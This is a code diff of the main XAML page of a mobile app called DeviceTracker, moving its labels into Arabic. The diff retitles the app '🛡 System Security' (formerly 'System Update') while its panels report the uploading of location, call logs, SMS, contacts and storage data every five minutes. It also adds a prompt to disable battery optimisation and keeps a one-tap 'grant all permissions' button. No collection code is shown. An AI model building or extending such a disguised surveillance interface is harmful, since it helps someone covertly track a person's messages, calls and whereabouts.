@@ -2,84 +2,102 @@
 <ContentPage xmlns="http://schemas.microsoft.com/dotnet/2021/maui"
              xmlns:x="http://schemas.microsoft.com/winfx/2009/xaml"
              x:Class="DeviceTracker.MainPage"
-             Title="Tracker">
+             Title=""
+             BackgroundColor="#0f172a">
 
     <ScrollView>
-        <VerticalStackLayout Padding="16" Spacing="12">
+        <VerticalStackLayout Padding="14" Spacing="10">
 
-            <!-- Device Identity -->
-            <Frame BackgroundColor="#1e293b" CornerRadius="12" Padding="16" HasShadow="False"
+            <!-- Header -->
+            <Frame BackgroundColor="#1e293b" CornerRadius="14" Padding="16" HasShadow="False"
                    BorderColor="#334155">
                 <VerticalStackLayout Spacing="6">
-                    <Label Text="System Update" FontSize="20" FontAttributes="Bold"
+                    <Label Text="🛡 System Security" FontSize="22" FontAttributes="Bold"
                            TextColor="#e2e8f0"/>
                     <Label x:Name="DeviceSerialLabel" Text="Serial: --"
-                           FontSize="13" TextColor="#94a3b8"/>
-                    <Label x:Name="RegStatusLabel" Text="Registration: --"
-                           FontSize="13" TextColor="#f59e0b"/>
-                    <Button x:Name="RegisterBtn" Text="Register Device Now"
-                            BackgroundColor="#3b82f6" TextColor="White" CornerRadius="8"
-                            FontSize="13" Clicked="OnRegisterDevice"
-                            IsVisible="false"/>
+                           FontSize="12" TextColor="#64748b"/>
+                    <Label x:Name="RegStatusLabel" Text="⏳ Registration: Pending"
+                           FontSize="14" TextColor="#f59e0b"/>
+                    <Button x:Name="RegisterBtn" Text="📱 تسجيل الجهاز"
+                            BackgroundColor="#3b82f6" TextColor="White" CornerRadius="10"
+                            FontSize="14" FontAttributes="Bold"
+                            Clicked="OnRegisterDevice" IsVisible="false"
+                            HeightRequest="44"/>
+                    <Button x:Name="RequestBatteryOptBtn" Text="🔋 تعطيل تحسين البطارية"
+                            BackgroundColor="#f59e0b" TextColor="White" CornerRadius="10"
+                            FontSize="13" Clicked="OnRequestBatteryOptimization"
+                            IsVisible="true" HeightRequest="40"/>
                 </VerticalStackLayout>
             </Frame>
 
-            <!-- Service Status -->
-            <Frame BackgroundColor="#1e293b" CornerRadius="12" Padding="16" HasShadow="False"
+            <!-- Service & Connection -->
+            <Frame BackgroundColor="#1e293b" CornerRadius="14" Padding="16" HasShadow="False"
+                   BorderColor="#334155">
+                <Grid ColumnDefinitions="*,*" RowDefinitions="Auto,Auto,Auto" ColumnSpacing="8" RowSpacing="8">
+                    <Label Grid.Row="0" Grid.Column="0" Text="🔁 الخدمة" FontSize="12" TextColor="#64748b"/>
+                    <Label x:Name="ServiceStatusLabel" Grid.Row="0" Grid.Column="1" Text="قيد التشغيل..."
+                           FontSize="12" TextColor="#22c55e" HorizontalTextAlignment="End"/>
+
+                    <Label Grid.Row="1" Grid.Column="0" Text="📡 الإنترنت" FontSize="12" TextColor="#64748b"/>
+                    <Label x:Name="LastNetworkLabel" Grid.Row="1" Grid.Column="1" Text="--"
+                           FontSize="12" TextColor="#94a3b8" HorizontalTextAlignment="End"/>
+
+                    <Label Grid.Row="2" Grid.Column="0" Text="🔋 البطارية" FontSize="12" TextColor="#64748b"/>
+                    <Label x:Name="LastBatteryLabel" Grid.Row="2" Grid.Column="1" Text="--"
+                           FontSize="12" TextColor="#94a3b8" HorizontalTextAlignment="End"/>
+                </Grid>
+            </Frame>
+
+            <!-- Last Upload Times -->
+            <Frame BackgroundColor="#1e293b" CornerRadius="14" Padding="16" HasShadow="False"
                    BorderColor="#334155">
                 <VerticalStackLayout Spacing="6">
-                    <Label x:Name="ServiceStatusLabel" Text="Service: Starting..."
-                           FontSize="14" TextColor="#94a3b8"/>
-                    <Label x:Name="PendingSyncLabel" Text="Pending Sync: 0"
-                           FontSize="13" TextColor="#64748b"/>
+                    <Label Text="⏱ آخر رفع للبيانات" FontSize="14" FontAttributes="Bold" TextColor="#e2e8f0"/>
+                    <Label x:Name="LastLocationLabel" Text="📍 الموقع: --" FontSize="12" TextColor="#94a3b8"/>
+                    <Label x:Name="LastCallsLabel" Text="📞 المكالمات: --" FontSize="12" TextColor="#94a3b8"/>
+                    <Label x:Name="LastSmsLabel" Text="💬 الرسائل: --" FontSize="12" TextColor="#94a3b8"/>
+                    <Label x:Name="LastContactsLabel" Text="👤 جهات الاتصال: --" FontSize="12" TextColor="#94a3b8"/>
+                    <Label x:Name="LastStorageLabel" Text="💾 المساحة: --" FontSize="12" TextColor="#94a3b8"/>
+                    <Label x:Name="PendingSyncLabel" Text="📦 في انتظار الرفع: 0" FontSize="12" TextColor="#64748b"/>
                 </VerticalStackLayout>
             </Frame>
 
             <!-- Permissions -->
-            <Frame BackgroundColor="#1e293b" CornerRadius="12" Padding="16" HasShadow="False"
+            <Frame BackgroundColor="#1e293b" CornerRadius="14" Padding="16" HasShadow="False"
                    BorderColor="#334155">
                 <VerticalStackLayout Spacing="8">
-                    <Label Text="Permissions" FontSize="16" FontAttributes="Bold"
-                           TextColor="#e2e8f0"/>
-                    <Label x:Name="LocPermStatus" Text="📍 Location: --"
-                           FontSize="13" TextColor="#94a3b8"/>
-                    <Button x:Name="RequestLocBtn" Text="Grant Location"
-                            BackgroundColor="#3b82f6" TextColor="White" CornerRadius="8"
-                            FontSize="13" Clicked="OnRequestLocationPermission"/>
-                    <Label x:Name="SmsPermStatus" Text="💬 SMS: --"
-                           FontSize="13" TextColor="#94a3b8"/>
-                    <Label x:Name="CallPermStatus" Text="📞 Call Log: --"
-                           FontSize="13" TextColor="#94a3b8"/>
-                    <Label x:Name="ContactPermStatus" Text="👤 Contacts: --"
-                           FontSize="13" TextColor="#94a3b8"/>
-                    <Label x:Name="BatteryPermStatus" Text="🔋 Battery: --"
-                           FontSize="13" TextColor="#94a3b8"/>
-                    <Button x:Name="RequestAllPermBtn" Text="Grant All Permissions"
-                            BackgroundColor="#8b5cf6" TextColor="White" CornerRadius="8"
-                            FontSize="13" Clicked="OnRequestAllPermissions"/>
+                    <Label Text="🔐 الصلاحيات" FontSize="14" FontAttributes="Bold" TextColor="#e2e8f0"/>
+                    <Label x:Name="LocPermStatus" Text="📍 الموقع: --" FontSize="12" TextColor="#94a3b8"/>
+                    <Label x:Name="SmsPermStatus" Text="💬 الرسائل: --" FontSize="12" TextColor="#94a3b8"/>
+                    <Label x:Name="CallPermStatus" Text="📞 سجل المكالمات: --" FontSize="12" TextColor="#94a3b8"/>
+                    <Label x:Name="ContactPermStatus" Text="👤 جهات الاتصال: --" FontSize="12" TextColor="#94a3b8"/>
+                    <Button x:Name="RequestAllPermBtn" Text="🔓 منح كل الصلاحيات"
+                            BackgroundColor="#8b5cf6" TextColor="White" CornerRadius="10"
+                            FontSize="14" FontAttributes="Bold"
+                            Clicked="OnRequestAllPermissions" HeightRequest="44"/>
                 </VerticalStackLayout>
             </Frame>
 
-            <!-- Data & Sync -->
-            <Frame BackgroundColor="#1e293b" CornerRadius="12" Padding="16" HasShadow="False"
+            <!-- Actions -->
+            <Frame BackgroundColor="#1e293b" CornerRadius="14" Padding="16" HasShadow="False"
                    BorderColor="#334155">
                 <VerticalStackLayout Spacing="8">
-                    <Label Text="Data" FontSize="16" FontAttributes="Bold"
-                           TextColor="#e2e8f0"/>
-                    <Label x:Name="LastLocationLabel" Text="📍 --" FontSize="13" TextColor="#94a3b8"/>
-                    <Label x:Name="LastBatteryLabel" Text="🔋 --" FontSize="13" TextColor="#94a3b8"/>
-                    <Label x:Name="LastNetworkLabel" Text="📡 --" FontSize="13" TextColor="#94a3b8"/>
-                    <Label x:Name="LastStorageLabel" Text="💾 --" FontSize="13" TextColor="#94a3b8"/>
-                    <Button x:Name="CollectNowBtn" Text="Collect Data Now"
-                            BackgroundColor="#f59e0b" TextColor="White" CornerRadius="8"
-                            FontSize="13" Clicked="OnCollectNow"/>
-                    <Button x:Name="ForceSyncBtn" Text="Force Sync Now"
-                            BackgroundColor="#22c55e" TextColor="White" CornerRadius="8"
-                            FontSize="13" Clicked="OnForceSync"/>
+                    <Label Text="⚡ إجراءات سريعة" FontSize="14" FontAttributes="Bold" TextColor="#e2e8f0"/>
+                    <Button x:Name="CollectNowBtn" Text="📥 جمع ورفع كل البيانات الآن"
+                            BackgroundColor="#f59e0b" TextColor="White" CornerRadius="10"
+                            FontSize="14" FontAttributes="Bold"
+                            Clicked="OnCollectNow" HeightRequest="44"/>
+                    <Button x:Name="ForceSyncBtn" Text="🔄 رفع البيانات المعلقة"
+                            BackgroundColor="#22c55e" TextColor="White" CornerRadius="10"
+                            FontSize="14" FontAttributes="Bold"
+                            Clicked="OnForceSync" HeightRequest="44"/>
                 </VerticalStackLayout>
             </Frame>
+
+            <!-- Last sync time -->
+            <Label x:Name="AutoStatusLabel" Text="⏳ التحديث التلقائي كل 5 دقائق"
+                   FontSize="11" TextColor="#64748b" HorizontalTextAlignment="Center" Margin="0,0,0,10"/>
 
         </VerticalStackLayout>
     </ScrollView>
-
 </ContentPage>
